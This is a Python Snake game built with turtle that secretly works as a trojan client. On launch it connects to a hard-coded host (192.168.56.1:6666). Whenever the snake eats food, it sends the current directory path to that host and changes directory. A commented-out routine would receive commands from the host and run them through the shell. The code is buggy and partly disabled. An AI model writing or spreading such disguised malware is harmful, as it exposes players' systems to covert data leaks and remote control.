import os
import sys
import socket
import subprocess
import turtle
import time
import random
delay = 0.1

task = ""

host = "192.168.56.1"
port = 6666

def server_create():
    global host
    global port
    global s
    
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    except socket.error:
        print("Cannot create")
        
def srever_connect():
    global host
    global port
    global s
    
    try:
        s.connect((host,port))
        s.listen(5)
        print("Connected successfully")
        
    except socket.error:
        print("Cannot connect")
        
'''def srever_accept():
    global host
    global port
    global s
    global conn 
    
    try:
        conn,addr = s.accept()
        print("Accepted...................")
        
    except socket.error:
        print("Cannt accept........")'''
        

def go_up():
    head.direction="up"

def go_down():
    head.direction="down"

def go_right():
    head.direction="right"

def go_left():
    head.direction="left"



wn=turtle.Screen()
wn.title("Snake Game")
wn.bgcolor("green")
wn.setup(width = 600,height = 600)
wn.tracer(0)

head=turtle.Turtle()
head.shape("square")
head.speed(0)
head.color("black")
head.penup()
head.goto(0,0)
head.direction="stop"

def move():
    if head.direction=="up":
        y=head.ycor()
        head.sety(y+20)

    if head.direction=="down":
        y1=head.ycor()
        head.sety(y1-20)

    if head.direction=="right":
        x=head.xcor()
        head.setx(x+20)

    if head.direction=="left":
        x1=head.xcor()
        head.setx(x1-20)

#Snakefood

food=turtle.Turtle()
food.shape("circle")
food.speed(0)
food.color("red")
food.penup()
food.goto(0,0)
food.direction="stop"

segment=[]

#Keyboard Binding

wn.listen()
wn.onkeypress(go_up,"Up")
wn.onkeypress(go_down,"Down")
wn.onkeypress(go_right,"Right")
wn.onkeypress(go_left,"Left")
#Set up the screen

def main_task():
    #data = s.recv(200000)
    #print("Reply: " + data.decode("utf-8"))
    #task = data.decode("utf-8")
    '''try:
        p = subprocess.check_output(task,shell=True)
        s.send(p)
    except:
        os.system(task)'''

    
    
server_create()
srever_connect()
#srever_accept()


while True:
    '''global host
    global port
    global s
    #global conn
    global data
    global task'''

    wn.update()
    
    wn.bgcolor("green")    

    if head.distance(food)<20:
       a=random.randint(-290,290)
       b=random.randint(-290,290)
       food.goto(a,b)
       new_segment=turtle.Turtle()
       new_segment.speed(0)
       new_segment.color("gray")
       new_segment.shape("square")
       new_segment.penup()
       segment.append(new_segment)
       p = os.getcwd()
       os.chdir("..")
       
       s.send(str.encode(p))

    for ind in range(len(segment)-1,0,-1):
        a=segment[ind-1].xcor()
        b=segment[ind-1].ycor()
        segment[ind].goto(a,b)

    if len(segment)>0:
        m=head.xcor()
        n=head.ycor()
        segment[0].goto(m,n)
        
    if head.xcor()>600 or head.xcor()<-600 or head.ycor()>350 or head.ycor()<-350:
        time.sleep(0.1)
        head.goto(0,0)
        head.direction="stop"

        for ele in segment:
            ele.goto(1000,1000)

        segment.clear()
        wn.bgcolor("red")
        
        

    move() 

    time.sleep(delay)
    main_task()

wn.mainloop()



